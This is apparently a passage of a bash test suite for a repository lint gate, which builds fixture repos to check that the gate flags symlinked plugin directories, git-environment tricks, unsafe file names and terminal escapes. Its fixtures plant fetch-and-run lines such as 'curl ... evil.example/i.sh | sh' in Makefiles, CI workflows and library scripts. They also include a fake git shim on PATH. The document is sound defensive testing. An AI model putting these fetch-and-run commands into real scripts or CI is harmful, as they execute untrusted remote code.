r="$work/plug-ef-sub"; _git_repo "$r"; seed "$r"; mkdir -p "$r/zsh/plugins2/evil"
printf 'noop() { : ; }\n' > "$r/zsh/plugins2/evil/e.zsh"
git -C "$r" add -A && git -C "$r" commit -qm init
rm -rf "$r/zsh/plugins2"; mkdir -p "$r/zsh/plugins"; ln -s plugins "$r/zsh/plugins2"
fails_with "$r" "$plugins_msg" "a tracked zsh/plugins2/evil/e.zsh whose zsh/plugins2 is zsh/plugins on disk must fail"
ef_out="$(STRICT= "$cp" "$r" 2>&1)" || true
case "$ef_out" in
  *"on disk, 'zsh/plugins2' is the same directory as zsh/plugins)"*) ok ;;
  *) fail "a tracked zsh/plugins2/evil/e.zsh whose zsh/plugins2 is zsh/plugins on disk must fail: $ef_out" ;;
esac
# a tracked symlink there: the git pass reports it as a symlink, and the
# always-on direct-child find as an entry that is not a pinned plugin
r="$work/plug-tracked-link"; _git_repo "$r"; seed "$r"; mkdir -p "$r/zsh/plugins"
ln -s ../../lib/os.sh "$r/zsh/plugins/evil-link"
git -C "$r" add -A && git -C "$r" commit -qm init
fails_with "$r" "$sym_git_msg" "a tracked symlink under zsh/plugins/ must report as a symlink"
fails_with "$r" "$plugins_msg" "a tracked symlink directly under zsh/plugins/ must fail the direct-child find"
# the direct-child find (it runs with or without a .git; these fixtures have
# none, so it is the only pass): a child that is not a directory
r="$work/plug-nogit-file"; seed "$r"; mkdir -p "$r/zsh/plugins"
printf 'x\n' > "$r/zsh/plugins/evil.sh"
fails_only_with "$r" "$plugins_msg" "a plain file directly under zsh/plugins/ (no .git) must fail"
r="$work/plug-nogit-link"; seed "$r"; mkdir -p "$r/zsh/plugins/p"
ln -s ./p "$r/zsh/plugins/evil-link"
fails_only_with "$r" "$plugins_msg" "a symlink directly under zsh/plugins/ (no .git) must fail"
# ...and that find fails closed on its own
if [ "$(id -u)" -ne 0 ]; then
  r="$work/plug-nogit-locked"; seed "$r"; mkdir -p "$r/zsh/plugins"
  chmod 000 "$r/zsh/plugins"
  fails_with_rc 2 "$r" "check-patterns: zsh/plugins scan (find) errored" "an unreadable zsh/plugins (no .git) must fail closed" only
  chmod u+rwx "$r/zsh/plugins"
else
  echo "  SKIP: running as root - cannot exercise the zsh/plugins find fail-closed case"
fi

# === arm (12): git's local env var list is itself checked ====================
# _git_clean strips what `git rev-parse --local-env-vars` names; a failed,
# empty or partial answer would strip nothing and let a leaked GIT_DIR steer
# the pass. A git shim on PATH answers that one call, and a FRESH process
# confirms the shim is what check-patterns will see.
lev_msg="check-patterns: symlink scan (git, repo-wide) could not list git's local env vars"
r="$work/lev-target"; _git_repo "$r"; seed "$r"
git -C "$r" add -A && git -C "$r" commit -qm init
for how in fail empty nodir noindex; do
  shim="$work/lev-shim-$how"; mkdir -p "$shim"
  case "$how" in
    fail) lev_body="printf 'GIT_DIR\\nGIT_INDEX_FILE\\n'; exit 1" ;;
    empty) lev_body='exit 0' ;;
    nodir) lev_body="printf 'GIT_WORK_TREE\\nGIT_INDEX_FILE\\n'; exit 0" ;;
    noindex) lev_body="printf 'GIT_DIR\\nGIT_WORK_TREE\\n'; exit 0" ;;
  esac
  {
    printf '#!/bin/sh\n'
    printf 'if [ "$*" = "rev-parse --local-env-vars" ]; then %s; fi\n' "$lev_body"
    printf 'exec "%s" "$@"\n' "$real_git"
  } > "$shim/git"
  chmod u+x "$shim/git"
  lev_probe_rc=0
  lev_probe="$(PATH="$shim:$PATH" bash -c 'git rev-parse --local-env-vars')" || lev_probe_rc=$?
  case "$how" in
    fail) [ "$lev_probe_rc" -ne 0 ] && [ "$lev_probe" = "GIT_DIR"$'\n'"GIT_INDEX_FILE" ] ;;
    empty) [ "$lev_probe_rc" -eq 0 ] && [ -z "$lev_probe" ] ;;
    nodir) [ "$lev_probe" = "GIT_WORK_TREE"$'\n'"GIT_INDEX_FILE" ] ;;
    noindex) [ "$lev_probe" = "GIT_DIR"$'\n'"GIT_WORK_TREE" ] ;;
  esac || fail "the '$how' git shim is not what a fresh process sees (rc $lev_probe_rc): $lev_probe"
  PATH="$shim:$PATH" fails_with_rc 2 "$r" "$lev_msg" "a '$how' --local-env-vars answer must fail closed" only
done

# === arm (12): git inside $root never runs core.fsmonitor ====================
# That key names a program, and a read-only ls-files runs it. The fixture
# first proves its hook is live under a plain git call.
r="$work/fsmonitor"; _git_repo "$r"; seed "$r"
git -C "$r" add -A && git -C "$r" commit -qm init
fsm_hit="$work/fsmonitor-hit"
printf '#!/bin/sh\n: > "%s"\nexit 1\n' "$fsm_hit" > "$work/fsmonitor-hook"
chmod u+x "$work/fsmonitor-hook"
git -C "$r" config core.fsmonitor "$work/fsmonitor-hook"
git -C "$r" ls-files >/dev/null 2>&1 || true
[ -e "$fsm_hit" ] || fail "the core.fsmonitor fixture hook does not run under a plain git ls-files"
rm -f "$fsm_hit"
[ "$(run "$r")" = "0" ] && ok || fail "a clean repo with a core.fsmonitor hook must still pass"
[ ! -e "$fsm_hit" ] && ok || fail "check-patterns must not run the repo's core.fsmonitor program"

# === arm (12): a dubious-ownership repo fails the toplevel probe closed =====
# GIT_TEST_ASSUME_DIFFERENT_OWNER makes git treat the repo as another user's.
# It is a git-INTERNAL test knob, not a documented interface: if a git release
# drops it, the probe succeeds, the gate passes, and fails_only_with fails
# this case loudly ("the gate passed") - never a silent pass.
# No global or system config, so an ambient safe.directory cannot waive it.
r="$work/dubious"; _git_repo "$r"; seed "$r"
git -C "$r" add -A && git -C "$r" commit -qm init
GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1 GIT_TEST_ASSUME_DIFFERENT_OWNER=1 \
  fails_with_rc 2 "$r" "$sym_probe_msg" "a repo git refuses as dubiously owned must fail closed" only

# === arm (11): `-H` names the file even for a SINGLE operand ================
# grep drops the PATH prefix when it gets one operand. A tree whose only
# scanned path is install.sh hands arm 11 exactly one operand, so its report
# must still read PATH:NN:, which only `-H` guarantees (GNU and BSD alike).
r="$work/emdash-one-operand"; mkdir -p "$r"
printf 'a note %s trailing\n' "$em_dash" > "$r/install.sh"
out="$(STRICT= "$cp" "$r" 2>&1)" && fail "a lone em-dash operand: the gate passed"
case "$out" in
  *"$em_dash_msg"*) ;;
  *) fail "a lone em-dash operand: expected '$em_dash_msg', got: $out" ;;
esac
case "$out" in
  "$r/install.sh:1:a note $em_dash trailing"* | *$'\n'"$r/install.sh:1:a note $em_dash trailing"*) ok ;;
  *) fail "a lone em-dash operand must be reported as PATH:NN: (grep -H), got: $out" ;;
esac

# === edge fixtures across the arms: no final newline, CRLF, `:` and space ===
# Each arm must still fire, alone, and report the hit at ROOT/REL:1:, for a
# file ending without a newline, CRLF line endings (a stray \r before the
# line end), a space in the name and a name starting with `-` (an option to
# any tool that ever gets it as a bare operand): shapes a line-oriented gate
# can drop. A
# `:` in the name breaks the PATH:NN: split every arm relies on, so there the
# gate must fail CLOSED (exit 2) whatever each arm reports. The names differ
# by more than case: macOS's filesystem folds case.
# Fail-closed cases use fails_with_rc 2 (defined with the shared runners).
names_msg="check-patterns: a file name holding ':', a newline or a CR"
stray_msg="check-patterns: a file named check-patterns outside bin/"
# _edge_case ROOT REL MESSAGE LABEL - fails_only_with, plus the hit line.
_edge_case() {
  local rc=0 out line hit=0
  out="$(STRICT= "$cp" "$1" 2>&1)" || rc=$?
  [ "$rc" != "0" ] || fail "$4: the gate passed"
  case "$out" in
    *"$3"*) ;;
    *) fail "$4: expected the message '$3', got: $out" ;;
  esac
  while IFS= read -r line; do
    case "$line" in
      "$3"* | "check-patterns: SKIP "*) ;;
      check-patterns:*) fail "$4: another message fired too: $line" ;;
      "$1/$2:1:"*) hit=1 ;;
    esac
  done <<<"$out"
  [ "$hit" -eq 1 ] || fail "$4: no hit reported at '$1/$2:1:', got: $out"
  pass=$((pass + 1))
}
# ARM:DIR - the dir of each arm's surface the fixture file goes in. Arm 7
# reads install.sh and lib/*.sh alone, so every name keeps the .sh suffix.
for edge in 1:lib 2:lib 5:lib 6:lib 7:lib 8:tests 9:tests 10:tests 11:docs; do
  arm="${edge%%:*}"; dir="${edge#*:}"
  if [ "$arm" = 7 ]; then
    pc="$b32_msg|declare -A m"
  else
    pc="$(_plug_case "$arm")"
  fi
  for variant in noeol crlf colon space dash; do
    case "$variant" in
      noeol) name="edge-noeol.sh"; fmt='%s' ;;
      crlf) name="edge-crlf.sh"; fmt='%s\r\n' ;;
      colon) name="edge:colon.sh"; fmt='%s\n' ;;
      space) name="edge space.sh"; fmt='%s\n' ;;
      dash) name="-edge-dash.sh"; fmt='%s\n' ;;
    esac
    r="$work/edge-$arm-$variant"; seed "$r"; mkdir -p "$r/$dir"
    # shellcheck disable=SC2059  # the format is one of the fixed ones above
    printf "$fmt" "${pc#*|}" > "$r/$dir/$name"
    if [ "$variant" = colon ]; then
      fails_with_rc 2 "$r" "$names_msg" "arm $arm, $variant ($dir/$name)"
    else
      _edge_case "$r" "$dir/$name" "${pc%%|*}" "arm $arm, $variant ($dir/$name)"
    fi
  done
done

# --- arm 8's hits print sorted by PATH, then NUMERICALLY by line number:
# line 9 before line 10 of one file, and one file's hits kept together
# (edge-b.sh after all of edge.sh). A lexical key on the line number would
# print 10 before 9.
r="$work/edge-8-sort"; seed "$r"; mkdir -p "$r/tests"
pc="$(_plug_case 8)"
{ i=0; while [ "$i" -lt 8 ]; do printf ': filler\n'; i=$((i + 1)); done
  printf '%s\n' "${pc#*|}" "${pc#*|}"; } > "$r/tests/edge.sh"
printf '%s\n' "${pc#*|}" > "$r/tests/edge-b.sh"
out="$(STRICT= "$cp" "$r" 2>&1)" || true
got="$(printf '%s\n' "$out" | sed -n "s|^$r/tests/\\(edge[^/]*\\.sh:[0-9][0-9]*\\):.*|\\1|p")"
want="edge-b.sh:1"$'\n'"edge.sh:9"$'\n'"edge.sh:10"
[ "$got" = "$want" ] && ok \
  || fail "arm 8 hits must sort by PATH then numerically by line number; want '$want', got '$got': $out"

# === arm (12): file names the arms cannot read or skip fail CLOSED ==========
# A `:`, LF or CR in a name breaks the PATH:NN: split; a file named
# check-patterns outside bin/ is skipped by every recursive arm's
# `--exclude=check-patterns`. Either exits 2. Untracked on disk (find over the
# surface), and tracked OUTSIDE the surface (the repo-wide git pass alone).
nl=$'\n'; cr=$'\r'
r="$work/name-colon-dir"; seed "$r"; mkdir -p "$r/docs/a:b"
printf 'x\n' > "$r/docs/a:b/x.md"
fails_with_rc 2 "$r" "$names_msg" "a directory name holding ':'" only
r="$work/name-lf"; seed "$r"
printf 'x\n' > "$r/lib/a${nl}b.sh"
fails_with_rc 2 "$r" "$names_msg" "a file name holding a newline" only
r="$work/name-cr"; seed "$r"; mkdir -p "$r/tests"
printf 'x\n' > "$r/tests/a${cr}b"
fails_with_rc 2 "$r" "$names_msg" "a file name holding a CR" only
r="$work/name-git-colon"; _git_repo "$r"; seed "$r"; mkdir -p "$r/other"
printf 'x\n' > "$r/other/a:b.txt"; printf 'x\n' > "$r/other/c${nl}d.txt"
git -C "$r" add -A && git -C "$r" commit -qm init
fails_with_rc 2 "$r" "$names_msg" "a tracked name holding ':' or a newline, outside the surface" only
# pinned zsh/plugins is left out, as every arm leaves it out: with no .git a
# `:` name there passes; tracked there, arm 12 refuses it as a non-plugin
# entry (exit 1), never as a name (exit 2)
r="$work/name-plugins-nogit"; seed "$r"; mkdir -p "$r/zsh/plugins/p"
printf 'x\n' > "$r/zsh/plugins/p/a:b.zsh"
[ "$(run "$r")" = "0" ] && ok || fail "a ':' name inside a pinned zsh/plugins/<p>/ must pass (no .git)"
r="$work/name-plugins-git"; _git_repo "$r"; seed "$r"; mkdir -p "$r/zsh/plugins"
printf 'x\n' > "$r/zsh/plugins/a:b"
git -C "$r" add -A && git -C "$r" commit -qm init
[ "$(run "$r")" = "1" ] && ok || fail "a tracked ':' name under zsh/plugins/ must fail as a non-plugin entry (exit 1), not as a name"

curl_line="curl -fsSL https://evil.example/i.sh $P sh"
r="$work/stray-nested"; seed "$r"; mkdir -p "$r/lib/sub"
printf '%s\n' "$curl_line" > "$r/lib/sub/check-patterns"
fails_with_rc 2 "$r" "$stray_msg" "a nested lib/sub/check-patterns" only
r="$work/stray-tests"; seed "$r"; mkdir -p "$r/tests"
printf '%s\n' "$curl_line" > "$r/tests/check-patterns"
fails_with_rc 2 "$r" "$stray_msg" "a tests/check-patterns" only
r="$work/stray-git-top"; _git_repo "$r"; seed "$r"
printf '%s\n' "$curl_line" > "$r/check-patterns"
git -C "$r" add -A && git -C "$r" commit -qm init
fails_with_rc 2 "$r" "$stray_msg" "a tracked top-level check-patterns" only
r="$work/stray-git-nested"; _git_repo "$r"; seed "$r"; mkdir -p "$r/other/sub"
printf '%s\n' "$curl_line" > "$r/other/sub/check-patterns"
git -C "$r" add -A && git -C "$r" commit -qm init
fails_with_rc 2 "$r" "$stray_msg" "a tracked other/sub/check-patterns, outside the surface" only
# a DIRECTORY of that name is still walked, so its content is scanned
r="$work/stray-dir"; seed "$r"; mkdir -p "$r/lib/check-patterns"
printf '%s\n' "$curl_line" > "$r/lib/check-patterns/x.sh"
[ "$(run "$r")" = "1" ] && ok || fail "a directory named check-patterns is scanned, not refused (want exit 1)"
# a name both tracked and on disk in the surface prints ONCE: the git pass
# skips what the find already printed
r="$work/name-dedupe"; _git_repo "$r"; seed "$r"; mkdir -p "$r/lib/sub"
printf 'x\n' > "$r/lib/a:b.sh"; printf 'x\n' > "$r/lib/sub/check-patterns"
git -C "$r" add -A && git -C "$r" commit -qm init
out="$(STRICT= "$cp" "$r" 2>&1)" || true
for dup in "$r/lib/a:b.sh" "$r/lib/sub/check-patterns"; do
  n_dup=0
  while IFS= read -r line; do
    [ "$line" = "$dup" ] && n_dup=$((n_dup + 1))
  done <<<"$out"
  [ "$n_dup" -eq 1 ] && ok || fail "a tracked, on-disk name must print once, got $n_dup: $dup: $out"
done
# a find error must not count as reporting: a tracked `:` name or stray
# check-patterns beside an unreadable dir is still listed by the git pass and
# still exits 2. Root-skipped for the same `chmod 000` reason as the other
# fail-closed cases.
if [ "$(id -u)" -ne 0 ]; then
  for fe in "lib/a:b.sh|$names_msg" "lib/sub/check-patterns|$stray_msg"; do
    fe_rel="${fe%%|*}"
    r="$work/name-finderr-$(printf '%s' "${fe_rel##*/}" | tr ':.' '--')"
    _git_repo "$r"; seed "$r"; mkdir -p "$r/$(dirname "$fe_rel")" "$r/lib/locked"
    printf 'x\n' > "$r/$fe_rel"
    git -C "$r" add -A && git -C "$r" commit -qm init
    chmod 000 "$r/lib/locked"
    rc=0; out="$(STRICT= "$cp" "$r" 2>&1)" || rc=$?
    chmod u+rwx "$r/lib/locked"
    [ "$rc" = "2" ] && ok || fail "a find error beside a tracked $fe_rel must still exit 2, got $rc: $out"
    # without the find error this is only the plain dedupe case: prove it fired
    case "$out" in
      *"file-name scan (find) errored"*) ok ;;
      *) fail "a find error beside a tracked $fe_rel: the find error never fired: $out" ;;
    esac
    n_listed=0
    while IFS= read -r line; do
      [ "$line" = "$r/$fe_rel" ] && n_listed=$((n_listed + 1))
    done <<<"$out"
    case "$out" in
      *"${fe#*|}"*) [ "$n_listed" -eq 1 ] && ok \
        || fail "a find error beside a tracked $fe_rel: listed $n_listed times: $out" ;;
      *) fail "a find error beside a tracked $fe_rel: expected '${fe#*|}', got: $out" ;;
    esac
  done
else
  echo "  SKIP: running as root - cannot exercise the file-name find-error cases"
fi
# the scan ROOT's own path holding `:` or a newline fails closed too, before
# any arm runs, over a tree with a real arm 10 violation in it
root_msg="check-patterns: the scan root"
for r in "$work/rootcolon:1: #" "$work/rootlf-x${nl}y"; do
  seed "$r"; mkdir -p "$r/tests"
  printf '%s\n' "chmod -R go-w $D \"\$d\"" > "$r/tests/x_test.sh"
  fails_with_rc 2 "$r" "$root_msg" "a scan root holding ':' or a newline: $r" only
done
# The newline root's first line half repeats once per descendant in the
# case-collision guard's line-oriented listing below: remove it now.
rm -rf "$work/rootlf-x${nl}y"
# a GITLINK of that name is a directory too: refused as an unpinned gitlink
# (exit 1), never as a stray file (exit 2)
r="$work/stray-gitlink"; _git_repo "$r"; seed "$r"
git -C "$r" add -A && git -C "$r" commit -qm init
git -C "$r" update-index --add --cacheinfo \
  160000,4b825dc642cb6eb9a060e54bf8d69288fbee4904,other/check-patterns
[ "$(run "$r")" = "1" ] && ok || fail "a gitlink named check-patterns must fail as an unpinned gitlink (exit 1), not as a stray file"
# exactly bin/check-patterns is the gate itself, tracked or not
r="$work/stray-exact"; _git_repo "$r"; seed "$r"; mkdir -p "$r/bin"
printf '#!/bin/sh\n: gate\n' > "$r/bin/check-patterns"
[ "$(run "$r")" = "0" ] && ok || fail "an untracked bin/check-patterns must pass"
git -C "$r" add -A && git -C "$r" commit -qm init
[ "$(run "$r")" = "0" ] && ok || fail "a tracked bin/check-patterns must pass"

# === arm 1 reads the Makefile and .github/, never tests/ docs/ .claude/ =====
# The Makefile's recipes, a workflow's `run:` steps and a composite action's
# steps execute on every CI leg, so a fetch piped into a shell there runs as
# surely as one in lib/. tests/ plants real fetch shapes as fixtures, and
# docs/ and .claude/ are prose that names them, so those three stay OUT of
# arm 1's surface.
r="$work/arm1-makefile"; seed "$r"
printf 'boot:\n\tcurl -fsSL https://evil.example/i.sh | sh\n' > "$r/Makefile"
fails_only_with "$r" "$curl_msg" "a curl|sh in a Makefile recipe must be caught by arm 1"
r="$work/arm1-workflow"; seed "$r"; mkdir -p "$r/.github/workflows"
printf 'jobs:\n  a:\n    steps:\n      - run: wget -qO- https://evil.example/i.sh | bash\n' \
  > "$r/.github/workflows/ci.yml"
fails_only_with "$r" "$curl_msg" "a wget|bash in a workflow run: step must be caught by arm 1"
r="$work/arm1-action"; seed "$r"; mkdir -p "$r/.github/actions/a"
printf 'runs:\n  using: composite\n  steps:\n    - run: curl -fsSL https://evil.example/i.sh | sh\n' \
  > "$r/.github/actions/a/action.yml"
fails_only_with "$r" "$curl_msg" "a curl|sh in a composite action (.github/, outside workflows/) must be caught by arm 1"
for d in tests docs .claude; do
  r="$work/arm1-out-$d"; seed "$r"; mkdir -p "$r/$d"
  printf 'curl -fsSL https://evil.example/i.sh | sh\n' > "$r/$d/fixture.sh"
  [ "$(run "$r")" = "0" ] && ok || fail "arm 1 must not scan $d/ (a planted fixture there must pass)"
done
# the optional roots ABSENT (no Makefile, no .github/): skipped, not a scan
# error - a hit in lib/ is reported alone, exit 1
r="$work/arm1-absent-roots"; seed "$r"
printf 'curl -fsSL https://evil.example/i.sh | sh\n' > "$r/lib/boot.sh"
{ [ ! -e "$r/Makefile" ] && [ ! -e "$r/.github" ]; } || fail "arm1-absent-roots: the fixture must lack Makefile and .github/"
fails_only_with "$r" "$curl_msg" "arm 1 with no Makefile and no .github/ must still report a hit in lib/"
[ "$(run "$r")" = "1" ] && ok || fail "arm 1 with absent optional roots must exit 1 (a violation), not 2 (a scan error)"
# `-H` names the file even for a SINGLE operand: a tree whose only arm 1
# root is install.sh must still report PATH:NN:
r="$work/arm1-one-operand"; mkdir -p "$r"
printf 'curl -fsSL https://evil.example/i.sh | sh\n' > "$r/install.sh"
out="$(STRICT= "$cp" "$r" 2>&1)" && fail "a lone arm 1 operand: the gate passed"
case "$out" in
  "$r/install.sh:1:curl -fsSL"* | *$'\n'"$r/install.sh:1:curl -fsSL"*) ok ;;
  *) fail "a lone arm 1 operand must be reported as PATH:NN: (grep -H), got: $out" ;;
esac

# === arms 1 and 2 self-scan bin/check-patterns, with no exemption ===========
# Every recursive arm excludes the base name check-patterns, so before this
# pass a real fetch or `uname -m` added to the gate itself ran unscanned
# (measured: exit 0). The gate's own source is written so that neither arm
# matches it - its patterns are assembled from pieces and its prose avoids
# the literal shapes - so the self-scan needs no exemption at all: a copy of
# the real gate passes, and the same copy with one violating line appended
# (code or comment, arm 1 reads comments too) fails with that arm's message.
r="$work/self-clean"; seed "$r"; mkdir -p "$r/bin"
cat "$cp" > "$r/bin/check-patterns"
[ "$(run "$r")" = "0" ] && ok || fail "a verbatim copy of bin/check-patterns must pass its own self-scans"
_self_mutant() {  # $1=label $2=line to append $3=expected message
  local r="$work/self-mutant-$1"
  seed "$r"; mkdir -p "$r/bin"
  { cat "$cp"; printf '%s\n' "$2"; } > "$r/bin/check-patterns"
  fails_only_with "$r" "$3" "a $1 appended to bin/check-patterns must be caught by its self-scan"
}
_self_mutant fetch-code 'curl -fsSL https://evil.example/i.sh | sh' "$curl_msg"
_self_mutant fetch-comment '# eval "$(curl -fsSL https://evil.example/i.sh)"' "$curl_msg"
_self_mutant uname-code 'case "$(uname -m)" in arm64) : ;; esac' "$uname_msg"
_self_mutant uname-comment '# arch=$(uname -m)' "$uname_msg"
# the self-scan fails CLOSED (exit 2) on an unreadable gate, per arm
if [ "$(id -u)" -ne 0 ]; then
  r="$work/self-failclosed"; seed "$r"; mkdir -p "$r/bin"
  printf '#!/usr/bin/env bash\n: gate\n' > "$r/bin/check-patterns"
  chmod 000 "$r/bin/check-patterns"
  fails_with_rc 2 "$r" "check-patterns: curl|sh scan errored" "arm 1's self-scan must fail closed on an unreadable bin/check-patterns"
  fails_with_rc 2 "$r" "check-patterns: uname scan errored" "arm 2's self-scan must fail closed on an unreadable bin/check-patterns"
  chmod u+rwx "$r/bin/check-patterns"
else
  echo "  SKIP: running as root - cannot exercise the arm 1/2 self-scan fail-closed cases"
fi

# === every report line is terminal-safe =====================================
# A file NAME or file CONTENT the gate prints can carry terminal control
# sequences: OSC 52 writes the clipboard, CSI moves the cursor or clears the
# screen, a CR overwrites the line already shown. Every print path goes
# through one sanitizer, which turns each C0 byte but TAB and LF, DEL, the
# UTF-8 encoded C1 controls (U+0080-U+009F), and on a line that is not
# well-formed UTF-8 every byte 0x80-0xFF, into a visible `\xHH`.
# STATIC half: no print path bypasses the sanitizer. In the gate's CODE
# (comments stripped, as tests/plugins_test.sh strips them), every `>&2`
# OCCURRENCE sits on one of the helper lines _tty_fail, _err and _err_file,
# or on a `printf` of a fixed single-quoted string with no expansion
# (_fatal_mark's message, which must print even when the sanitizer cannot);
# nothing names another way out (`>&1` other than a captured `2>&1`, a
# variable fd, /dev/stdout, /dev/stderr, /dev/tty, /dev/fd/, an `exec`
# redirection); and every find, grep, sed, sort and git command
# (continuation lines joined, git also through _git_clean) sends its stderr
# somewhere (`2>`), since an error there names a path or echoes an operand.
# Checked per LOGICAL line: one `2>` on it counts for every tool there, so
# this is a heuristic that catches a forgotten redirect, not a proof of the
# invariant (accepted, operator 2026-09-28).
# The one allowance is structural, not a hand-kept list: a STDIN READER, the
# command right after a `|` or one fed by a here-string (`<<<`), reads no
# path and has no file of the tree to name. Stdout is the harder half to pin
# statically (a function's stdout is also how it returns a value), so arm 1,
# the one arm that prints on stdout, is covered by the fixtures below.
cp_code="$(sed -E 's/(^|[[:space:];&|()])#.*$/\1/' "$cp")"
# `|| true` inside each count: no match is a count of 0, which the check
# below names, not an ERR from pipefail.
cp_n2="$({ grep -o -e '>&2' <<<"$cp_code" || true; } | wc -l | tr -d ' ')"
cp_n2_helper="$({ grep -E '^_(tty_fail|err|err_file)\(\) \{' <<<"$cp_code" || true; } | { grep -o -e '>&2' || true; } | wc -l | tr -d ' ')"
cp_n2_fixed="$({ grep -E "^[[:space:]]*printf '[^'\$]*' >&2 [|][|] :\$" <<<"$cp_code" || true; } | wc -l | tr -d ' ')"
[ "$cp_n2" -eq 4 ] && [ "$cp_n2_helper" -eq 3 ] && [ "$cp_n2_fixed" -eq 1 ] && ok \
  || fail "bin/check-patterns: every '>&2' must be on one of the 3 sanitizer helper lines or the 1 fixed-string printf (found $cp_n2, $cp_n2_helper on helpers, $cp_n2_fixed fixed)"
# `2>&1` is allowed: every one sits inside a `$(...)` capture whose text is
# then printed through a helper.
cp_other="$(grep -nE '(^|[^2])>&1|>&[[:space:]]*["$]|/dev/(stdout|stderr|tty|fd/)|(^|[^[:alnum:]_])exec[[:space:]]+[0-9]*[<>]' <<<"$cp_code" || true)"
[ -z "$cp_other" ] && ok \
  || fail "bin/check-patterns: an output path around the sanitizer: $cp_other"
# A tool in COMMAND position: at the line start, or after `$(`, `;`, `&&`,
# `||`, `!`, `if`, `then` or a leading `VAR=value` assignment. Quoted prose
# ("(grep -q/-m/-l, head)") holds a tool word too, but never after one of
# these. A `|` before the tool makes it a stdin reader.
cp_tool_re='(^|\$\(|;|&&|[|][|]|!|[|]|(^|[[:space:]])(if|then))[[:space:]]*([A-Za-z_][A-Za-z0-9_]*=[^[:space:]]*[[:space:]]+)*(find|grep|sed|sort|git|_git_clean)([[:space:]]|$)'
cp_stdin_re='[|][[:space:]]*([A-Za-z_][A-Za-z0-9_]*=[^[:space:]]*[[:space:]]+)*(grep|sed|sort)([[:space:]]|$)|<<<'
cp_tool_n=0; cp_stdin_n=0; cp_tool_bad=""; cp_logical=""
while IFS= read -r line; do
  case "$line" in
    *\\) cp_logical="$cp_logical${line%\\} "; continue ;;
  esac
  cp_logical="$cp_logical$line"
  # `[[:space:]]*` after `|` keeps `||` from reading as a pipe: `||` is
  # matched first in cp_tool_re, and a stdin reader is only a single `|`.
  if grep -qE -e "$cp_tool_re" <<<"$cp_logical"; then
    case "$cp_logical" in
      *'2>'*) cp_tool_n=$((cp_tool_n + 1)) ;;
      *)
        if grep -qE -e "$cp_stdin_re" <<<"${cp_logical//||/}"; then
          cp_stdin_n=$((cp_stdin_n + 1))
        else
          cp_tool_bad="$cp_tool_bad$cp_logical"$'\n'
        fi ;;
    esac
  fi
  cp_logical=""
done <<<"$cp_code"
[ "$cp_tool_n" -ge 20 ] && [ "$cp_stdin_n" -ge 5 ] && [ -z "$cp_tool_bad" ] && ok \
  || fail "bin/check-patterns: every find/grep/sed/sort/git must redirect its stderr unless it reads stdin ($cp_tool_n redirected, $cp_stdin_n stdin readers), unredirected: $cp_tool_bad"

# Every RECURSIVE grep reads a binary file as text (`-a`), and no grep in the
# gate skips one (`-I`, a `--binary-files` value other than `text`): with
# `-I` a file holding one NUL byte was skipped whole, hiding every violation
# in it, and without `-a` GNU grep in a UTF-8 locale called a file with an
# invalid byte binary and printed "Binary file ... matches" instead of the
# hit. Regression protection, not a parser: per LOGICAL line (continuation
# lines joined), quoted strings folded to one word, every grep, egrep or
# fgrep word (behind `\` or a path too, after `-exec` or `xargs` too) up to
# the end of its command. GNU permutes argv, so an option after an operand
# counts, up to a `--`. An option taking an argument takes it the way getopt
# does (`-C0`, `-d recurse`, `--binary-files without-match`). An array in
# the argv counts by the option words of its own assignments in TEXT.
# _rgrep_words TEXT -> the global rg_w: TEXT's words, each "${NAME[@]}" as
# `@ARR:NAME`, each quoted string as `Q`, and `| || && ; ( )` split off.
_rgrep_words() {
  local t
  t="$(printf '%s\n' "$1" | sed -E \
    -e 's/"?\$\{([A-Za-z_][A-Za-z0-9_]*)\[@\]\}"?/ @ARR:\1 /g' \
    -e "s/'[^']*'/Q/g" -e 's/"[^"]*"/Q/g' \
    -e 's/(\|\||&&|[|;()])/ \1 /g')"
  rg_w=()
  read -r -a rg_w <<<"$t" || true
}
# _rgrep_opt WORD -> updates rg_rec, rg_txt, rg_skip, rg_pend for one option
# word (rg_pend: the kind of argument the NEXT word is: d, bf, arg or "").
_rgrep_opt() {
  local w="$1" i c rest
  case "$w" in
    --recursive | --dereference-recursive | --directories=recurse) rg_rec=1 ;;
    --text | --binary-files=text) rg_txt=1 ;;
    --binary-files=*) rg_skip=1 ;;
    --binary-files) rg_pend=bf ;;
    --directories) rg_pend=d ;;
    --regexp | --file | --exclude | --include | --exclude-dir | --max-count | \
      --context | --after-context | --before-context | --label) rg_pend=arg ;;
    --*) ;;
    -?*)
      i=1
      while [ "$i" -lt "${#w}" ]; do
        c="${w:$i:1}"
        case "$c" in
          r | R) rg_rec=1 ;;
          a) rg_txt=1 ;;
          I) rg_skip=1 ;;
          e | f | d | A | B | C | m)
            rest="${w:$((i + 1))}"
            if [ -z "$rest" ]; then
              if [ "$c" = d ]; then rg_pend=d; else rg_pend=arg; fi
            elif [ "$c" = d ] && [ "$rest" = recurse ]; then
              rg_rec=1
            fi
            break ;;
        esac
        i=$((i + 1))
      done ;;
  esac
}
# _rgrep_done TEXT LOGICAL - close one grep command: fold in its arrays'
# assignments, then count it and record a violation.
_rgrep_done() {
  local name aline aw
  for name in ${rg_arrs[@]+"${rg_arrs[@]}"}; do
    while IFS= read -r aline; do
      _rgrep_words "$aline"
      for aw in ${rg_w[@]+"${rg_w[@]}"}; do
        case "$aw" in -?*) rg_pend=""; _rgrep_opt "$aw" ;; esac
      done
    done <<<"$(printf '%s\n' "$1" | grep -E -e "(^|[^A-Za-z0-9_])$name\+?=\(" || true)"
  done
  if [ "$rg_rec" -eq 1 ]; then
    rg_n=$((rg_n + 1))
    [ "$rg_txt" -eq 1 ] || rg_bad="$rg_bad(no -a) $2"$'\n'
  fi
  [ "$rg_skip" -eq 0 ] || rg_bad="$rg_bad(-I) $2"$'\n'
}
# _rgrep_scan TEXT -> the globals rg_n (recursive grep commands) and rg_bad.
_rgrep_scan() {
  local line logical="" w in_grep
  rg_n=0; rg_bad=""
  while IFS= read -r line; do
    case "$line" in
      *\\) logical="$logical${line%\\} "; continue ;;
    esac
    logical="$logical$line"
    _rgrep_words "$logical"
    in_grep=0
    for w in ${rg_w[@]+"${rg_w[@]}"} ';'; do
      if [ "$in_grep" -eq 1 ]; then
        case "$w" in
          '|' | '||' | '&&' | ';' | '(' | ')')
            _rgrep_done "$1" "$logical"; in_grep=0 ;;
          *)
            if [ -n "$rg_pend" ]; then
              case "$rg_pend:$w" in
                d:recurse) rg_rec=1 ;;
                bf:text) rg_txt=1 ;;
                bf:*) rg_skip=1 ;;
              esac
              rg_pend=""
            elif [ "$rg_dd" -eq 0 ]; then
              case "$w" in
